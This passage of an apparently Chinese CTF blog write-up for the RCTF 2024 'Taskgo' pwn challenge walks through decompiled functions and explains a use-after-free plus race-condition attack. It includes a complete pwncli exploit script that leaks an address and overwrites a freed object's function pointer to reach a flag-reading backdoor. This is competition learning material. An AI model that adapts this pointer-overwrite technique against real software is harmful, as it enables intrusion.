class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall MagicCastle::BuyMS(MagicCastle *this)</span><br><span class="line">&#123;</span><br><span class="line">  v21 = <span class="number">-1431655766</span>;</span><br><span class="line">  v1 = (__int128 *)g_player;</span><br><span class="line">  [...]</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)v1 + <span class="number">4</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_5:</span><br><span class="line">    v2 = std::__Cr::__put_character_sequence&lt;char,std::__Cr::char_traits&lt;char&gt;&gt;(</span><br><span class="line">           &amp;std::__Cr::cout,</span><br><span class="line">           <span class="string">&quot;You already possess a magic, hurry up and learn it.&quot;</span>,</span><br><span class="line">           <span class="number">51</span>LL);</span><br><span class="line">    [...]</span><br><span class="line">    <span class="keyword">return</span> std::__Cr::basic_ostream&lt;char,std::__Cr::char_traits&lt;char&gt;&gt;::flush(v2);</span><br><span class="line">  &#125;</span><br><span class="line">  std::__Cr::basic_istream&lt;char,std::__Cr::char_traits&lt;char&gt;&gt;::operator&gt;&gt;(&amp;std::__Cr::cin, &amp;v21);</span><br><span class="line">  <span class="keyword">switch</span> ( v21 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>u:</span><br><span class="line">      [...]</span><br><span class="line">      result = Player::CheckMoney(v18, <span class="number">0x1869F</span>u);</span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)result )</span><br><span class="line">      &#123;</span><br><span class="line">        v19 = (__int128 *)g_player;</span><br><span class="line">        [...]</span><br><span class="line">        result = operator <span class="built_in">new</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">        BYTE7(v22[<span class="number">1</span>]) = <span class="number">21</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v22 &gt; (_OWORD *)<span class="string">&quot;Magic Scroll of Stone&quot;</span> || (char *)&amp;v22[<span class="number">1</span>] + <span class="number">5</span> &lt;= <span class="string">&quot;Magic Scroll of Stone&quot;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          strcpy((char *)v22, <span class="string">&quot;Magic Scroll of Stone&quot;</span>);</span><br><span class="line">          *(_QWORD *)result = off_124FF0;</span><br><span class="line">          *(_QWORD *)(result + <span class="number">0x28</span>) = Log;</span><br><span class="line">          *(_OWORD *)(result + <span class="number">8</span>) = v22[<span class="number">0</span>];</span><br><span class="line">          *(_QWORD *)(result + <span class="number">0x18</span>) = *(_QWORD *)&amp;v22[<span class="number">1</span>];</span><br><span class="line">          *(_BYTE *)(result + <span class="number">0x20</span>) = <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>u:</span><br><span class="line">      result = Player::CheckMoney(v18, <span class="number">0x2710</span>u);</span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)result )</span><br><span class="line">      &#123;</span><br><span class="line">        v19 = (__int128 *)g_player;</span><br><span class="line">        result = operator <span class="built_in">new</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">        BYTE7(v22[<span class="number">1</span>]) = <span class="number">21</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v22 &gt; (_OWORD *)<span class="string">&quot;Magic Scroll of Water&quot;</span> || (char *)&amp;v22[<span class="number">1</span>] + <span class="number">5</span> &lt;= <span class="string">&quot;Magic Scroll of Water&quot;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          strcpy((char *)v22, <span class="string">&quot;Magic Scroll of Water&quot;</span>);</span><br><span class="line">          *(_QWORD *)result = off_124FF0;</span><br><span class="line">          *(_QWORD *)(result + <span class="number">0x28</span>) = Log;</span><br><span class="line">          *(_OWORD *)(result + <span class="number">8</span>) = v22[<span class="number">0</span>];</span><br><span class="line">          *(_QWORD *)(result + <span class="number">0x18</span>) = *(_QWORD *)&amp;v22[<span class="number">1</span>];</span><br><span class="line">          *(_BYTE *)(result + <span class="number">0x20</span>) = <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>u:</span><br><span class="line">      result = Player::CheckMoney(v18, <span class="number">0x2710</span>u);</span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)result )</span><br><span class="line">      &#123;</span><br><span class="line">        v19 = (__int128 *)g_player;</span><br><span class="line">        result = operator <span class="built_in">new</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">        BYTE7(v22[<span class="number">1</span>]) = <span class="number">21</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v22 &gt; (_OWORD *)<span class="string">&quot;Magic Scroll of Flame&quot;</span> || (char *)&amp;v22[<span class="number">1</span>] + <span class="number">5</span> &lt;= <span class="string">&quot;Magic Scroll of Flame&quot;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          strcpy((char *)v22, <span class="string">&quot;Magic Scroll of Flame&quot;</span>);</span><br><span class="line">          *(_QWORD *)result = off_124FF0;</span><br><span class="line">          *(_QWORD *)(result + <span class="number">0x28</span>) = Log;</span><br><span class="line">          *(_OWORD *)(result + <span class="number">8</span>) = v22[<span class="number">0</span>];</span><br><span class="line">          *(_QWORD *)(result + <span class="number">0x18</span>) = *(_QWORD *)&amp;v22[<span class="number">1</span>];</span><br><span class="line">          *(_BYTE *)(result + <span class="number">0x20</span>) = <span class="number">1</span>;</span><br><span class="line">LABEL_44:</span><br><span class="line">          v20 = *((_QWORD *)v19 + <span class="number">4</span>);</span><br><span class="line">          *((_QWORD *)v19 + <span class="number">4</span>) = result;</span><br><span class="line">          <span class="keyword">if</span> ( v20 )</span><br><span class="line">            <span class="keyword">return</span> (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v20 + <span class="number">8</span>LL))(v20);</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>MagicCastle::LearningMS(this)</strong></p>
+<p>这里发现可以改变g_player+0x1c的值，根据magic_cast的0x20的值做与运算，而我们正好可以利用 1, 2, 4 将其改为7，从而进入Gods函数，进行条件竞争的利用。</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall MagicCastle::LearningMS(MagicCastle *this)</span><br><span class="line">&#123;</span><br><span class="line">  v1 = (__int128 *)g_player;</span><br><span class="line">  v2 = (__int128 *)g_player;</span><br><span class="line">  [...]</span><br><span class="line">  <span class="comment">// 调试发现其为 MagicHeld::GetTalent()，取出*((unsigned __int8 *)this + 0x20);</span></span><br><span class="line">  result = (*(__int64 (__fastcall **)(_QWORD))(**((_QWORD **)v2 + <span class="number">4</span>) + <span class="number">0x18</span>LL))(*((_QWORD *)v2 + <span class="number">4</span>));</span><br><span class="line">  *((_BYTE *)v1 + <span class="number">0x1C</span>) |= result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>MagicCastle::DropMS</strong></p>
+<p>这里将0x30大小的magic_cast释放了，而在Gods函数里面我们会申请一个0x40大小的堆块，可以尝试利用条件竞争修改已经释放的Cast，将其保存的Log函数为BackDoor函数(题目给的一个用于读取文件的函数)或者system函数地址。Gods函数调用了v1(&amp;g_player)，如果名字为flag或cat flag，那麽就调用了BackDoor(“flag”)或者system(“cat flag”)。</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall MagicCastle::DropMS(MagicCastle *this)</span><br><span class="line">&#123;</span><br><span class="line">  v8[<span class="number">0</span>] = v1;</span><br><span class="line">  [...]</span><br><span class="line">  v6 = (__int128 *)g_player;</span><br><span class="line">  v7 = *((_QWORD *)v6 + <span class="number">4</span>);</span><br><span class="line">  *((_QWORD *)v6 + <span class="number">4</span>) = <span class="number">0</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">    <span class="comment">// 调试发现其为 MagicHeld::~MagicHeld()</span></span><br><span class="line">    <span class="keyword">return</span> (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v7 + <span class="number">8</span>LL))(v7);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>但在调试中发现，Gods中申请的堆块与magic_cast并不是同一堆块且相隔很远，cyclic() 测距时，偏移为0x28，并且在cin结束后就已经读入到释放掉的magic_cast中原来Log的位置了，可能go在cin变长读取时在堆上申请了缓冲区。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.binary = <span class="string">&#x27;./ctf&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">gift.io = process(<span class="string">&#x27;./ctf&#x27;</span>)</span><br><span class="line"><span class="comment"># gift.io = remote(&#x27;127.0.0.1&#x27;, 13337)</span></span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./ctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io: tube = gift.io</span><br><span class="line">elf: ELF = gift.elf</span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadgets: list = get_current_one_gadget_from_libc(more=False)</span></span><br><span class="line"><span class="comment"># CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">gdbscript=<span class="string">&quot;&quot;</span>, stop=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(io, process):</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">        <span class="keyword">if</span> stop:</span><br><span class="line">            pause()</span><br><span class="line"><span class="comment"># 1. Rapidly advancing in the rapids.</span></span><br><span class="line"><span class="comment"># 2. Magic Castle.</span></span><br><span class="line"><span class="comment"># 3. Show Money.</span></span><br><span class="line"><span class="comment"># 4. Quit.</span></span><br><span class="line"><span class="comment"># &gt;&gt; </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wooden</span>():</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">silver</span>():</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">golden</span>():</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buyMs</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    cmd(idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dropMs</span>():</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">learningMs</span>():</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">god</span>():</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    cmd(<span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_gods</span>():</span><br><span class="line">    <span class="keyword">global</span> backdoor</span><br><span class="line">    golden()</span><br><span class="line"></span><br><span class="line">    buyMs(<span class="number">1</span>)</span><br><span class="line">    learningMs()</span><br><span class="line">    dropMs()</span><br><span class="line"></span><br><span class="line">    buyMs(<span class="number">2</span>)</span><br><span class="line">    learningMs()</span><br><span class="line">    dropMs()</span><br><span class="line"></span><br><span class="line">    buyMs(<span class="number">3</span>)</span><br><span class="line">    learningMs()</span><br><span class="line"></span><br><span class="line">    show()</span><br><span class="line"></span><br><span class="line">    god()</span><br><span class="line">    ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    <span class="comment"># 0xBA0-0x950</span></span><br><span class="line">    backdoor = <span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)+<span class="number">0x250</span></span><br><span class="line">    success(<span class="string">&quot;backdoor = &quot;</span>+<span class="built_in">hex</span>(backdoor))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    cmd(<span class="number">1337</span>)</span><br><span class="line">    dropMs()</span><br><span class="line"></span><br><span class="line">    wooden()</span><br><span class="line">    sla(<span class="string">b&quot;visit.&quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&quot;Comments: &quot;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(backdoor))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;name: &#x27;</span>, <span class="string">b&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">get_Gods()</span><br><span class="line">get_flag()</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div>
+
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> RCTF-2024-pwn</li>
+        <li><strong>Author:</strong> 韩乔落</li>
+        <li><strong>Created at
+                :</strong> 2024-05-28 14:19:01</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-05-29 17:46:33
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://jelasin.github.io/2024/05/28/RCTF-2024-pwn/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/RCTF/">#RCTF</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/05/30/Android%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80%E7%AF%87/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Android安全-基础篇</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/05/21/Android%E9%80%86%E5%90%91-Frida%E7%AF%87/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Android逆向-Frida篇</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="giscus-container"></div>
+    <script data-swup-reload-script defer>
+        async function loadGiscus() {
+            const giscusConfig = {
+                'src': 'https://giscus.app/client.js',
+                'data-repo': 'jelasin/jelasin.github.io',
+                'data-repo-id': 'R_kgDOKVydDA',
+                'data-category': 'Announcements',
+                'data-category-id': 'DIC_kwDOKVydDM4CZe2W',
+                'data-mapping': 'pathname',
+                'data-strict': '0',
+                'data-reactions-enabled': '1',
+                'data-emit-metadata': '1',
+                'data-theme': 'preferred_color_scheme',
+                'data-lang': 'zh-CN',
+                'data-input-position': 'bottom',
+                'data-loading': 'not-lazy',
+                'crossorigin': 'anonymous',
+                'async': true
+            }
+            const giscusScript = document.createElement('script');
+            for (const key in giscusConfig) {
+                giscusScript.setAttribute(key, giscusConfig[key]);
+            }
+            document.getElementById('giscus-container').appendChild(giscusScript);
+        }
+        if ('true') {
+            let loadGiscusTimeout = setTimeout(() => {
+                loadGiscus();
+                clearTimeout(loadGiscusTimeout);
+            }, 1000);
+        } else {
+            document.addEventListener('DOMContentLoaded', loadGiscus);
+        }
+    </script>
+
+
+        
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">RCTF-2024-pwn</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Taskgo"><span class="nav-text">Taskgo</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-text">逆向分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">关山初度尘未洗，策马扬鞭再奋蹄。</div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-circle-info fa-beat-fade" style="--fa-beat-fade-opacity: 0.67; --fa-beat-fade-scale: 1.075;" ></i>&nbsp;&nbsp;<a href="/">韩乔落</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        38 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.4</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    <script src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/libs/Swup.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/libs/SwupSlideTheme.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/libs/SwupScriptsPlugin.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/libs/SwupProgressPlugin.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/libs/SwupScrollPlugin.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine/2.6.4/source/js/libs/SwupPreloadPlugin.min.js"></script>
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
